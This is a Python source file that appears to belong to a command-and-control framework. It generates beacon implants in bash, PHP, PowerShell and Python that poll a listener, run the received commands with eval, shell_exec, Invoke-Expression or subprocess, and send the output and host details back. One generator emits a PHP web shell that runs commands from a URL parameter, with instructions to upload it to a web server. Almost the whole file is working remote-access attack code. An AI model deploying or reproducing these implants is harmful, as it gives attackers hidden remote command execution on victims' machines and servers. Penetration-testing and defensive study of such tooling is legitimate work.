"""
Beacon communication protocol and script generators.

Features:
- JSON command/response format
- Session ID tracking
- Multiple beacon script types (bash, PHP, PowerShell)
- Jitter and sleep configuration
- Optional AES encryption (future enhancement)
"""

import json
import base64
from typing import Dict, Any, Optional


class BeaconProtocol:
    """Beacon communication protocol.

    Handles beacon script generation and payload formatting for various
    target platforms (Linux, Windows, web shells).

    Supported beacon types:
    - bash: Linux systems with bash and curl
    - php: Web shells (PHP)
    - powershell: Windows systems with PowerShell
    - python: Systems with Python available

    Example:
        >>> protocol = BeaconProtocol()
        >>> script = protocol.generate_beacon_script(
        ...     beacon_type='bash',
        ...     listener_url='http://192.168.45.150:8080',
        ...     session_id='abc123',
        ...     interval=5
        ... )
        >>> print(script)
    """

    @staticmethod
    def generate_beacon_script(
        beacon_type: str,
        listener_url: str,
        session_id: str,
        interval: int = 5,
        jitter: int = 0,
        encrypted: bool = False,
        encryption_key: Optional[str] = None
    ) -> str:
        """Generate beacon script for specified type.

        Args:
            beacon_type: Type of beacon ('bash', 'php', 'powershell', 'python')
            listener_url: URL of beacon listener (http://LHOST:PORT)
            session_id: Session identifier (UUID)
            interval: Beacon interval in seconds (default: 5)
            jitter: Random jitter to add to interval in seconds (default: 0)
            encrypted: Enable AES encryption (default: False)
            encryption_key: AES encryption key (required if encrypted=True)

        Returns:
            Beacon script as string

        Raises:
            ValueError: If beacon_type not supported or encryption_key missing
        """
        beacon_generators = {
            'bash': BeaconProtocol._generate_bash_beacon,
            'php': BeaconProtocol._generate_php_beacon,
            'powershell': BeaconProtocol._generate_powershell_beacon,
            'python': BeaconProtocol._generate_python_beacon,
            'php_web': BeaconProtocol._generate_php_web_beacon
        }

        if beacon_type not in beacon_generators:
            raise ValueError(
                f"Unsupported beacon type: {beacon_type}. "
                f"Supported: {', '.join(beacon_generators.keys())}"
            )

        if encrypted and not encryption_key:
            raise ValueError("encryption_key required when encrypted=True")

        generator = beacon_generators[beacon_type]
        return generator(
            listener_url=listener_url,
            session_id=session_id,
            interval=interval,
            jitter=jitter,
            encrypted=encrypted,
            encryption_key=encryption_key
        )

    @staticmethod
    def _generate_bash_beacon(
        listener_url: str,
        session_id: str,
        interval: int,
        jitter: int,
        encrypted: bool,
        encryption_key: Optional[str]
    ) -> str:
        """Generate bash beacon script.

        Requirements:
        - curl or wget
        - jq (for JSON parsing, optional but recommended)
        - bash

        Returns:
            Bash beacon script
        """
        beacon_url = f"{listener_url}/beacon"

        # Build jitter command
        jitter_cmd = ""
        if jitter > 0:
            jitter_cmd = f"SLEEP_TIME=$((INTERVAL + RANDOM % {jitter}))"
        else:
            jitter_cmd = "SLEEP_TIME=$INTERVAL"

        script = f'''#!/bin/bash
# HTTP Beacon - Session {session_id}
# Beacon URL: {beacon_url}
# Interval: {interval}s (jitter: {jitter}s)

SESSION_ID="{session_id}"
BEACON_URL="{beacon_url}"
INTERVAL={interval}
LAST_CMD=""
LAST_OUTPUT=""

# Get system info
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
USERNAME=$(whoami 2>/dev/null || echo "unknown")
OS=$(uname -s 2>/dev/null || echo "unknown")
SHELL_TYPE=$(basename "$SHELL" 2>/dev/null || echo "bash")

echo "[*] Starting beacon: $SESSION_ID"
echo "[*] Target: $BEACON_URL"
echo "[*] System: $USERNAME@$HOSTNAME ($OS)"
echo "[*] Interval: ${{INTERVAL}}s"

# Main beacon loop
while true; do
    # Calculate sleep time with jitter
    {jitter_cmd}

    # Execute last command if provided
    if [ -n "$LAST_CMD" ] && [ "$LAST_CMD" != "null" ]; then
        echo "[+] Executing: $LAST_CMD"
        LAST_OUTPUT=$(eval "$LAST_CMD" 2>&1)
    fi

    # Build beacon payload
    PAYLOAD=$(cat <<EOF
{{
    "session_id": "$SESSION_ID",
    "hostname": "$HOSTNAME",
    "username": "$USERNAME",
    "os": "$OS",
    "shell_type": "$SHELL_TYPE",
    "response": "$LAST_OUTPUT"
}}
EOF
)

    # Send beacon and get next command
    RESPONSE=$(curl -s -X POST "$BEACON_URL" \\
        -H "Content-Type: application/json" \\
        -d "$PAYLOAD" 2>/dev/null)

    if [ $? -eq 0 ]; then
        # Parse command from response (using jq if available, otherwise grep)
        if command -v jq &> /dev/null; then
            LAST_CMD=$(echo "$RESPONSE" | jq -r '.command // empty')
        else
            LAST_CMD=$(echo "$RESPONSE" | grep -oP '"command"\\s*:\\s*"\\K[^"]+' || echo "")
        fi

        if [ -n "$LAST_CMD" ] && [ "$LAST_CMD" != "null" ]; then
            echo "[+] Received command: $LAST_CMD"
        fi
    else
        echo "[-] Beacon failed"
        LAST_CMD=""
    fi

    # Sleep
    sleep "$SLEEP_TIME"
done
'''
        return script

    @staticmethod
    def _generate_php_beacon(
        listener_url: str,
        session_id: str,
        interval: int,
        jitter: int,
        encrypted: bool,
        encryption_key: Optional[str]
    ) -> str:
        """Generate PHP beacon script (CLI).

        Requirements:
        - PHP CLI
        - curl extension

        Returns:
            PHP beacon script
        """
        beacon_url = f"{listener_url}/beacon"

        script = f'''<?php
// HTTP Beacon - Session {session_id}
// Beacon URL: {beacon_url}
// Interval: {interval}s (jitter: {jitter}s)

$session_id = "{session_id}";
$beacon_url = "{beacon_url}";
$interval = {interval};
$jitter = {jitter};
$last_cmd = "";

// Get system info
$hostname = gethostname();
$username = get_current_user();
$os = PHP_OS;
$shell_type = "php";

echo "[*] Starting beacon: $session_id\\n";
echo "[*] Target: $beacon_url\\n";
echo "[*] System: $username@$hostname ($os)\\n";
echo "[*] Interval: {{$interval}}s\\n";

// Main beacon loop
while (true) {{
    // Calculate sleep time with jitter
    $sleep_time = $interval;
    if ($jitter > 0) {{
        $sleep_time += rand(0, $jitter);
    }}

    // Execute last command if provided
    $last_output = "";
    if (!empty($last_cmd) && $last_cmd !== "null") {{
        echo "[+] Executing: $last_cmd\\n";
        $last_output = shell_exec($last_cmd);
    }}

    // Build beacon payload
    $payload = json_encode([
        "session_id" => $session_id,
        "hostname" => $hostname,
        "username" => $username,
        "os" => $os,
        "shell_type" => $shell_type,
        "response" => $last_output
    ]);

    // Send beacon and get next command
    $ch = curl_init($beacon_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code === 200) {{
        $data = json_decode($response, true);
        $last_cmd = $data['command'] ?? "";

        if (!empty($last_cmd) && $last_cmd !== "null") {{
            echo "[+] Received command: $last_cmd\\n";
        }}
    }} else {{
        echo "[-] Beacon failed (HTTP $http_code)\\n";
        $last_cmd = "";
    }}

    // Sleep
    sleep($sleep_time);
}}
?>
'''
        return script

    @staticmethod
    def _generate_php_web_beacon(
        listener_url: str,
        session_id: str,
        interval: int,
        jitter: int,
        encrypted: bool,
        encryption_key: Optional[str]
    ) -> str:
        """Generate PHP web shell beacon (single-file web shell).

        This is a web shell that includes beacon functionality.
        Upload to web server and access via browser to activate.

        Returns:
            PHP web shell with beacon
        """
        beacon_url = f"{listener_url}/beacon"

        script = f'''<?php
// Web Shell with Beacon - Session {session_id}

$session_id = "{session_id}";
$beacon_url = "{beacon_url}";

// Manual command execution (web shell mode)
if (isset($_GET['cmd'])) {{
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
    exit;
}}

// Beacon mode (triggered by ?beacon=1)
if (isset($_GET['beacon'])) {{
    $hostname = gethostname();
    $username = get_current_user();
    $os = PHP_OS;

    // Get last command response from session
    session_start();
    $last_output = $_SESSION['last_output'] ?? "";
    $_SESSION['last_output'] = "";

    // Send beacon
    $payload = json_encode([
        "session_id" => $session_id,
        "hostname" => $hostname,
        "username" => $username,
        "os" => $os,
        "shell_type" => "php_web",
        "response" => $last_output
    ]);

    $ch = curl_init($beacon_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

    $response = curl_exec($ch);
    curl_close($ch);

    // Execute command
    $data = json_decode($response, true);
    $command = $data['command'] ?? "";

    if (!empty($command)) {{
        $_SESSION['last_output'] = shell_exec($command);
        echo "Command queued: $command";
    }} else {{
        echo "No commands";
    }}

    exit;
}}

// Web interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
    <script>
        // Auto-beacon every {interval} seconds
        setInterval(function() {{
            fetch('?beacon=1')
                .then(r => r.text())
                .then(t => console.log('Beacon:', t));
        }}, {interval * 1000});
    </script>
</head>
<body>
    <h1>Web Shell</h1>
    <p>Session: {session_id}</p>
    <p>Beacon active (check console)</p>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command" />
        <button type="submit">Execute</button>
    </form>
</body>
</html>
'''
        return script

    @staticmethod
    def _generate_powershell_beacon(
        listener_url: str,
        session_id: str,
        interval: int,
        jitter: int,
        encrypted: bool,
        encryption_key: Optional[str]
    ) -> str:
        """Generate PowerShell beacon script.

        Requirements:
        - PowerShell 3.0+

        Returns:
            PowerShell beacon script
        """
        beacon_url = f"{listener_url}/beacon"

        script = f'''# HTTP Beacon - Session {session_id}
# Beacon URL: {beacon_url}
# Interval: {interval}s (jitter: {jitter}s)

$SessionId = "{session_id}"
$BeaconUrl = "{beacon_url}"
$Interval = {interval}
$Jitter = {jitter}
$LastCmd = ""

# Get system info
$Hostname = $env:COMPUTERNAME
$Username = $env:USERNAME
$OS = "Windows"
$ShellType = "powershell"

Write-Host "[*] Starting beacon: $SessionId"
Write-Host "[*] Target: $BeaconUrl"
Write-Host "[*] System: $Username@$Hostname ($OS)"
Write-Host "[*] Interval: ${{Interval}}s"

# Main beacon loop
while ($true) {{
    # Calculate sleep time with jitter
    $SleepTime = $Interval
    if ($Jitter -gt 0) {{
        $SleepTime += Get-Random -Minimum 0 -Maximum $Jitter
    }}

    # Execute last command if provided
    $LastOutput = ""
    if ($LastCmd -and $LastCmd -ne "null" -and $LastCmd -ne "") {{
        Write-Host "[+] Executing: $LastCmd"
        try {{
            $LastOutput = Invoke-Expression $LastCmd 2>&1 | Out-String
        }} catch {{
            $LastOutput = $_.Exception.Message
        }}
    }}

    # Build beacon payload
    $Payload = @{{
        session_id = $SessionId
        hostname = $Hostname
        username = $Username
        os = $OS
        shell_type = $ShellType
        response = $LastOutput
    }} | ConvertTo-Json

    # Send beacon and get next command
    try {{
        $Response = Invoke-RestMethod -Uri $BeaconUrl `
            -Method Post `
            -Body $Payload `
            -ContentType "application/json" `
            -ErrorAction Stop

        $LastCmd = $Response.command

        if ($LastCmd -and $LastCmd -ne "null") {{
            Write-Host "[+] Received command: $LastCmd"
        }}
    }} catch {{
        Write-Host "[-] Beacon failed: $_"
        $LastCmd = ""
    }}

    # Sleep
    Start-Sleep -Seconds $SleepTime
}}
'''
        return script

    @staticmethod
    def _generate_python_beacon(
        listener_url: str,
        session_id: str,
        interval: int,
        jitter: int,
        encrypted: bool,
        encryption_key: Optional[str]
    ) -> str:
        """Generate Python beacon script.

        Requirements:
        - Python 2.7+ or Python 3.x
        - requests library (or fallback to urllib)

        Returns:
            Python beacon script
        """
        beacon_url = f"{listener_url}/beacon"

        script = f'''#!/usr/bin/env python3
# HTTP Beacon - Session {session_id}
# Beacon URL: {beacon_url}
# Interval: {interval}s (jitter: {jitter}s)

import json
import subprocess
import time
import random
import socket
import getpass
import platform

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    HAS_REQUESTS = False

SESSION_ID = "{session_id}"
BEACON_URL = "{beacon_url}"
INTERVAL = {interval}
JITTER = {jitter}
last_cmd = ""

# Get system info
hostname = socket.gethostname()
username = getpass.getuser()
os_type = platform.system()
shell_type = "python"

print(f"[*] Starting beacon: {{SESSION_ID}}")
print(f"[*] Target: {{BEACON_URL}}")
print(f"[*] System: {{username}}@{{hostname}} ({{os_type}})")
print(f"[*] Interval: {{INTERVAL}}s")

def send_beacon(response_data):
    """Send beacon and get next command"""
    payload = {{
        "session_id": SESSION_ID,
        "hostname": hostname,
        "username": username,
        "os": os_type,
        "shell_type": shell_type,
        "response": response_data
    }}

    try:
        if HAS_REQUESTS:
            r = requests.post(BEACON_URL, json=payload, timeout=10)
            return r.json()
        else:
            # Fallback to urllib
            req = urllib.request.Request(
                BEACON_URL,
                data=json.dumps(payload).encode('utf-8'),
                headers={{'Content-Type': 'application/json'}}
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"[-] Beacon failed: {{e}}")
        return None

# Main beacon loop
while True:
    # Calculate sleep time with jitter
    sleep_time = INTERVAL
    if JITTER > 0:
        sleep_time += random.randint(0, JITTER)

    # Execute last command if provided
    last_output = ""
    if last_cmd and last_cmd != "null":
        print(f"[+] Executing: {{last_cmd}}")
        try:
            last_output = subprocess.check_output(
                last_cmd,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            last_output = e.output.decode('utf-8', errors='ignore')
        except Exception as e:
            last_output = str(e)

    # Send beacon
    response = send_beacon(last_output)

    if response:
        last_cmd = response.get('command', '')
        if last_cmd and last_cmd != "null":
            print(f"[+] Received command: {{last_cmd}}")
    else:
        last_cmd = ""

    # Sleep
    time.sleep(sleep_time)
'''
        return script

    @staticmethod
    def encrypt_payload(data: str, key: str) -> str:
        """AES encrypt beacon data (future enhancement).

        Args:
            data: Data to encrypt
            key: AES encryption key

        Returns:
            Base64-encoded encrypted data
        """
        # TODO: Implement AES encryption
        # For now, just base64 encode
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def decrypt_payload(data: str, key: str) -> str:
        """AES decrypt beacon response (future enhancement).

        Args:
            data: Base64-encoded encrypted data
            key: AES decryption key

        Returns:
            Decrypted data
        """
        # TODO: Implement AES decryption
        # For now, just base64 decode
        return base64.b64decode(data.encode()).decode()

    @staticmethod
    def create_registration_payload(
        target: str,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
        os_type: Optional[str] = None,
        shell_type: Optional[str] = None
    ) -> Dict[str, Any]:
        """Create registration payload for new beacon.

        Args:
            target: Target IP or hostname
            hostname: System hostname
            username: Current user
            os_type: Operating system
            shell_type: Shell type

        Returns:
            Registration payload dictionary
        """
        import socket
        import getpass
        import platform

        return {
            'target': target,
            'hostname': hostname or socket.gethostname(),
            'username': username or getpass.getuser(),
            'os': os_type or platform.system(),
            'shell_type': shell_type or 'bash'
        }
